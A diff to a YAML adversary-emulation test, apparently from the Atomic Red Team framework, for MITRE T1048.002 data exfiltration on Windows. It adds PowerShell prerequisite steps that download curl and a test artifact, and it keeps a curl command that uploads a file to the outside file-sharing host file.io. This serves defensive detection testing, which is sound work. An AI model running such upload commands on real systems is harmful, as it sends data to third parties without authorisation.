@@ -3,12 +3,12 @@ name: Exfiltrate data HTTPS using curl windows
 description: |
     Exfiltrate data HTTPS using curl to file share site file.io
 args:
-    - name: input_file
-      type: path
-      default: PathToAtomicsFolder/T1048.002/src/artifact
     - name: curl_path
       type: path
       default: C:\Windows\System32\Curl.exe
+    - name: input_file
+      type: path
+      default: PathToAtomicsFolder/T1048.002/src/artifact
 uuid: 1cdf2fb0-51b6-4fd8-96af-77020d5f1bf0
 mitre:
     tactics:
@@ -21,6 +21,22 @@ requirements:
     platforms:
         - os: windows
 steps:
+    - name: |
+        Curl must be installed on system.
+      inline: |
+        if (Test-Path #{curl_path}) {exit 0} else {{New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+        Invoke-WebRequest "https://curl.se/windows/dl-8.4.0_6/curl-8.4.0_6-win64-mingw.zip" -Outfile "PathToAtomicsFolder\..\ExternalPayloads\curl.zip"
+        Expand-Archive -Path "PathToAtomicsFolder\..\ExternalPayloads\curl.zip" -DestinationPath "PathToAtomicsFolder\..\ExternalPayloads\curl"
+        Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\curl\curl-8.4.0_6-win64-mingw\bin\curl.exe" C:\Windows\System32\Curl.exe
+        }}
+      executor: powershell
+    - name: |
+        #{input_file} must be exist on system.
+      inline: |
+        if (Test-Path "#{input_file}") {exit 0} else {{New-Item -Type Directory (split-path "#{input_file}") -ErrorAction ignore | Out-Null
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1048.002/src/artifact" -OutFile "#{input_file}"
+        }}
+      executor: powershell
     - name: exfiltrate-data-https-using-curl-windows
       inline: |
         {{.Args.curl_path}} -k -F "file=@{{.Args.input_file}}" https://file.io/
